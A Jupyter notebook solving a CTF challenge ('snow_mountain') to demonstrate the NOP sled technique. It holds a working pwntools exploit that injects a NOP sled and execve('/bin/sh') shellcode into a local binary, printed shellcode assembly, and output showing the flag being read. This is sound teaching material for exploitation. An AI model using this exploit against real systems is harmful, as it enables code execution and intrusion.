{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# NOP sled"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "tags": []
   },
   "source": [
    "## Example: snow_mountaint\n",
    "\n",
    "Source: MetasequoiaCTF\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[*] '/ctf/work/nop-sled/snow_mountain'\n",
      "    Arch:     amd64-64-little\n",
      "    RELRO:    Partial RELRO\n",
      "    Stack:    No canary found\n",
      "    NX:       NX disabled\n",
      "    PIE:      No PIE (0x400000)\n",
      "    RWX:      Has RWX segments\n"
     ]
    }
   ],
   "source": [
    "bin_filename = './snow_mountain'\n",
    "from pwn import *\n",
    "from pwnlib import gdb, shellcraft\n",
    "\n",
    "context.terminal = ['tmux', 'new-window']\n",
    "context.arch = 'amd64'\n",
    "elf = ELF(bin_filename)\n",
    "# print(elf.checksec())"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Reverse the binary, we get:\n",
    "\n",
    "```c\n",
    "char *stack_rand; // rax\n",
    "void (*func)(void); // [rsp+8h] [rbp-1008h] BYREF\n",
    "char buf[0x1000]; // [rsp+10h] [rbp-1000h] BYREF\n",
    "\n",
    "setbuf(stdout, 0LL);\n",
    "srand((unsigned int)buf);\n",
    "sleep_3sec();\n",
    "stack_rand = get_stack_rand();                // rsp +/- 0x300\n",
    "printf(\"...Current position: %p\\n\\n\", stack_rand);\n",
    "printf(\"What's your plan, hero?\\n> \");\n",
    "fgets(buf, 0x1000, stdin);\n",
    "printf(\"Where are you going to land?\\n> \");\n",
    "__isoc99_scanf(\"%p\", &func);\n",
    "func();\n",
    "```\n",
    "\n",
    "The key problem is we don't kwow the exact value of rsp. We can use \"nop sled\" technique to \n",
    "\n",
    "```\n",
    "---(higher address)--->\n",
    "       +----buf (rsp+0x10) \n",
    "       V\n",
    ".......bbbbbbbbbbbb\n",
    "|            |\n",
    "+--rsp_rand--+\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "def get_rsp_rand(io: tube):\n",
    "    io.recvuntil(b'Current position: ')\n",
    "    v = io.recvline()\n",
    "    return int(v.decode(), 16)\n",
    "\n",
    "def exploit(io: tube):\n",
    "    rsp_rand = get_rsp_rand(io)\n",
    "    io.recvuntil(b'> ')\n",
    "    # https://docs.pwntools.com/en/stable/shellcraft/aarch64.html\n",
    "    payload  = asm(shellcraft.nop()) * 0x600\n",
    "    payload += asm(shellcraft.amd64.linux.sh())\n",
    "    \n",
    "    # no newlines\n",
    "    assert all(b != 10 for b in payload)\n",
    "    \n",
    "    io.sendline(payload)\n",
    "    print(f'{rsp_rand=:x}')\n",
    "    io.sendline(f'{rsp_rand + 0x300:x}'.encode())\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[x] Starting local process './snow_mountain'\n",
      "[+] Starting local process './snow_mountain': pid 1901\n",
      "rsp_rand=7ffe8fedf520\n",
      "[DEBUG] Sent 0xc bytes:\n",
      "    b'cat ../flag\\n'\n",
      "[DEBUG] Sent 0x5 bytes:\n",
      "    b'exit\\n'\n",
      "[x] Receiving all data\n",
      "[x] Receiving all data: 0B\n",
      "[*] Process './snow_mountain' stopped with exit code 0 (pid 1901)\n",
      "[DEBUG] Received 0x11 bytes:\n",
      "    b'flag{hello world}'\n",
      "[x] Receiving all data: 17B\n",
      "[+] Receiving all data: Done (17B)\n",
      "b'flag{hello world}'\n"
     ]
    }
   ],
   "source": [
    "io = process(bin_filename)\n",
    "try:\n",
    "    exploit(io)\n",
    "    io.recvuntil(b'> ')\n",
    "    with context.local(log_level='debug'):\n",
    "        io.sendline(b'cat ../flag')\n",
    "        io.sendline(b'exit')\n",
    "        print(io.recvall())\n",
    "    io.poll(block=True)\n",
    "except Exception as e:\n",
    "    io.kill()\n",
    "    raise e"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "    /* execve(path='/bin///sh', argv=['sh'], envp=0) */\n",
      "    /* push b'/bin///sh\\x00' */\n",
      "    push 0x68\n",
      "    mov rax, 0x732f2f2f6e69622f\n",
      "    push rax\n",
      "    mov rdi, rsp\n",
      "    /* push argument array ['sh\\x00'] */\n",
      "    /* push b'sh\\x00' */\n",
      "    push 0x1010101 ^ 0x6873\n",
      "    xor dword ptr [rsp], 0x1010101\n",
      "    xor esi, esi /* 0 */\n",
      "    push rsi /* null terminate */\n",
      "    push 8\n",
      "    pop rsi\n",
      "    add rsi, rsp\n",
      "    push rsi /* 'sh\\x00' */\n",
      "    mov rsi, rsp\n",
      "    xor edx, edx /* 0 */\n",
      "    /* call execve() */\n",
      "    push SYS_execve /* 0x3b */\n",
      "    pop rax\n",
      "    syscall\n",
      "\n"
     ]
    }
   ],
   "source": [
    "print(shellcraft.amd64.linux.sh())"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.10"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
